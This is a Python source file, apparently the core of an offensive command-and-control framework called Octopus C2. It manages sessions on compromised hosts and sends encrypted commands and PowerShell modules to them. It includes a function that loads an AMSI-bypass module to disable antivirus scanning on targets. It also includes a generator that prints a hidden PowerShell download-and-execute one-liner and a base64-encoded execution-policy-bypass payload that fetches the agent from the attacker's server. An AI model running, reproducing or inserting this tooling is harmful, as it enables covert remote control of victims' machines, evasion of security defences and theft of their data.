#!/usr/bin/python

from tabulate import tabulate
import threading
from flask import *
from termcolor import colored
import logging
import base64
from encryption import *
import time
import os

requests = []
counter = 1
listener_id = 0
connections_information = {}
listeners_information = {}
commands = {}
aes_encryption_key = base64.b64encode("".join([random.choice(string.uppercase) for i in range(32)]))

oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell"]
oct_commands_interact = ["load", "help", "exit", "back", "clear", "upload", "download", "load", "report", "disable_amsi", "modules"]

def check_url(url):
	if len(listeners_information) > 0:
	    for listener in listeners_information:
			if url == listeners_information[listener][5]:
				return False
			else:
				return True
	else:
		return True

def check_listener_name(listener_name):
	if len(listeners_information) > 0:
	    for listener in listeners_information:
			if listener_name == listeners_information[listener][0]:
				return False
			else:
				return True
	else:
		return True

def list_sessions():
	    data = []
	    for key in connections_information:
	        data.append(connections_information[key])
	    print "\n\n" + tabulate(data, ["Session", "IP", "Hostname", "PID", "Username", "Domain", "Last ping", "OS"], "simple") + "\n\n"

def get_history():
    f = open(".console_history.oct", "r")
    print f.read()

def list_listeners():
	    data = []
	    for key in listeners_information:
	        data.append(listeners_information[key])
            # listener_name, ip, port, host, interval, path, listener_name
	    print "\n\n" + tabulate(data, ["Name", "IP", "Port", "Host", "Interval", "Path", "SSL", "AES_KEY"], "simple") + "\n\n"


def completer(text, state):
    options = [i for i in oct_commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

def completer_interact(text, state):
    options = [i for i in oct_commands_interact if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

def send_command(session, command):
	encrypted_command = base64.b64encode(encrypt_command(aes_encryption_key, command))
        commands[session] = encrypted_command
    	print "[+] Command sent , waiting for results"

def delete(hostname, sid):
    send_command(hostname, "kill $pid")
    time.sleep(5)
    commands.pop(hostname)
    connections_information.pop(sid)
    print "[+] Session %s killed !"%hostname

def list_modules():
	if os.path.isdir("modules"):
		modules = os.listdir("modules")
		for module in modules:
			oct_commands_interact.append(module)
			print module
	else:
		print colored("[-] modules directory not Available")

def persistence():
    # to do
    pass
def upload_file():
    pass
    # read file as base64 and save it to variable

def load_module(session, module_name):
	module = "modules/" + module_name
	if os.path.isfile(module):
		fi = open(module, "r")
		module_content = fi.read()
		# encrypt module before send it
		base64_command = base64.b64encode(encrypt_command(aes_encryption_key, module_content))
		commands[session] = base64_command
		print colored("[+] Module should be loaded !", "green")
	else:
		print colored("[-] Module is not exist !")

def disable_amsi(session):
	amsi_module = "modules/ASBBypass.ps1"
	if os.path.isfile(amsi_module):
		fi = open(amsi_module, "r")
		module_content = fi.read()
		base64_command = base64.b64encode(module_content)
		commands[session] = base64_command
		print colored("AMSI disable module has been loaded !", "green")

	else:
		print colored("[-] AMSI Module is not exist !")

def generate(hostname, path, proto, interval):
    print "\npowershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)

    f = open("agents/agent.ps1")

    pcode = f.read()
    pcode_edited = pcode.replace("SRVHOST", hostname).replace("OCU_INTERVAL", str(interval)).replace("OCU_PROTO", proto).encode("utf8").decode()
    pcode_final = base64.b64encode(pcode_edited)
    print colored("#====================\n", "red")
    print "powershell.exe -exec bypass -enc %s" % pcode_final



def main_help_banner():
    print "\n"
    print "Available commands to use :\n"
    print "Hint : the commands with * have arguments and you can see them by typing the command name only\n"
    print "+++++++++"
    print "help  \t\t\t\tshow this help menu"
    print "list  \t\t\t\tlist all connected agents"
    print "listeners \t\t\tlist all listeners"
    print "* generate_powershell \t\tgenerate powershell oneliner"
    print "* listen_http  \t\t\tto start a HTTP listener"
    print "* listen_https  \t\tto start a HTTPS listener"
    print "interact {session}  \t\tto interact with a session"
    print "delete {session}  \t\tto delete a session"
    print "exit \t\t\t\texit current session"
    print "\n"


def interact_help():
	print "\n"
	print "Available commands to use :\n"
	print "Hint : if you want to execute system command just type it and wait for the results\n"
	print "+++++++++"
	print "help  \t\t\t\tshow this help menu"
	print "exit/back \t\t\texit current session and back to the main screen"
	print "clear \t\t\t\tclear the screen output"
	print "upload \t\t\t\tupload file to the target machine"
	print "download \t\t\tdownload file from the target machine"
	print "load \t\t\t\tload powershell module to the target machine"
	print "disable_amsi \t\t\tdisable AMSI on the target machine"
	print "report \t\t\t\tget situation report from the target"
	print "\n"


def banner():
	# \033[94m
    version = '\33[43m V1.0 Beta \033[0m'
    Yellow = '\33[33m'
    OKGREEN = '\033[92m'
    CRED = '\033[91m'
    ENDC = '\033[0m'

    banner =  r'''

{0}
  /$$$$$$              /$$
 /$$__  $$            | $$
| $$  \ $$  /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$$
| $$  | $$ /$$_____/|_  $$_/   /$$__  $$ /$$__  $$| $$  | $$ /$$_____/
| $$  | $$| $$        | $$    | $$  \ $$| $$  \ $$| $$  | $$|  $$$$$$
| $$  | $$| $$        | $$ /$$| $$  | $$| $$  | $$| $$  | $$ \____  $$
|  $$$$$$/|  $$$$$$$  |  $$$$/|  $$$$$$/| $$$$$$$/|  $$$$$$/ /$$$$$$$/
 \______/  \_______/   \___/   \______/ | $$____/  \______/ |_______/
                                        | $$
                                        | $$
                                        |__/

{1}

					    {3}V1.0 BETA !{1}


{2} Octopus C2 | Control your shells {1}

    '''


    print banner.format(CRED, ENDC, OKGREEN, Yellow)
